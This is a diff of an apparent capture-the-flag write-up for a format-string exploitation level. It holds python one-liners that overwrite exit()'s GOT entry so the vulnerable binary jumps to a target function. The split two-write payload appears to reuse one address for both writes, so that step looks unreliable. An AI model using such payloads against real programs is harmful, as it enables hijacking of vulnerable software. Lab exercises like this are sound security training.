@@ -33,8 +33,9 @@ We need addr of `o()`, `exit()`, `the offset of the string`
 * exit addr => 0x08 04 98 38 (using objdump -R)
 * By trying we get an off set of 4
 
-str => `addr exit`\
-`python -c "print '\x38\x98\x04\x08' + '%134513824x%4\$hn'" > /tmp/exploit_5; cat /tmp/exploit_5 - | ./level5` << this is valid but let try a faster way cause waiting 134 513 824 space to print is long
+str => `addr exit` + nb_chr %offset$n\
+
+`python -c "print '\x38\x98\x04\x08' + '%134513824x%4\$n'" > /tmp/exploit_5; cat /tmp/exploit_5 - | ./level5` << this is valid but let try a faster way cause waiting 134 513 824 space to print is long
 
 We can split the addr of 0 in 2 and but it in 2 time :\
 `python -c "print '\x38\x98\x04\x08' + '%2048x%4\$hn' + '%31904x%4\$hn'" > /tmp/exploit_5; cat /tmp/exploit_5 - | ./level5`
